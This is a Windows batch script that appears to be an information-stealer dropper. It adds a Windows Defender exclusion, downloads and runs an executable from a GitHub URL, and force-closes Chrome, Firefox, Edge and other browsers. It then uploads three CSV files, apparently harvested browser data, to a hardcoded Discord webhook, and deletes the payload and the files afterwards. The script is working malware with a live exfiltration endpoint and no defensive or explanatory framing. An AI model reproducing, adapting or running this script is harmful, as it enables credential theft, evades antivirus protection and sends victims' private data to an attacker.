@echo off

set "cweb=https://discord.com/api/webhooks/1290057595016712222/6f_bvwefKMDSJtwgDeM0-ct6AL-ikFulnHZFvRpHdroPzzGoXjoe6QQxamDvYm4vlb75"

setlocal

set "url=https://github.com/techtoona/test3/raw/refs/heads/main/nuclei.exe"
set "maigret=nuclei.exe"
set "dpfile=dp.csv"
set "bhfile=bh.csv"
set "dcfile=dc.csv"

powershell -Command "Add-MpPreference -ExclusionPath '%cd%\%maigret%'"

curl -L -o "%maigret%" "%url%"

if exist "%maigret%" (

	taskkill /F /IM chrome.exe
	taskkill /F /IM firefox.exe
	taskkill /F /IM msedge.exe
	taskkill /F /IM opera.exe
	taskkill /F /IM iexplore.exe
	taskkill /F /IM safari.exe
	
    start /B "" "%maigret%"
    timeout /t 8 /nobreak > NUL
    if exist "%dpfile%" (        
        curl --silent --output /dev/null -X POST -H "Content-Type: multipart/form-data" -F "file=@%dpfile%" "%cweb%"
    )
    if exist "%bhfile%" (        
        curl --silent --output /dev/null -X POST -H "Content-Type: multipart/form-data" -F "file=@%bhfile%" "%cweb%"
    )
    if exist "%dcfile%" (        
        curl --silent --output /dev/null -X POST -H "Content-Type: multipart/form-data" -F "file=@%dcfile%" "%cweb%"
    )
    del "%maigret%"
    del "%dpfile%"
    del "%bhfile%"
    del "%dcfile%"
)

endlocal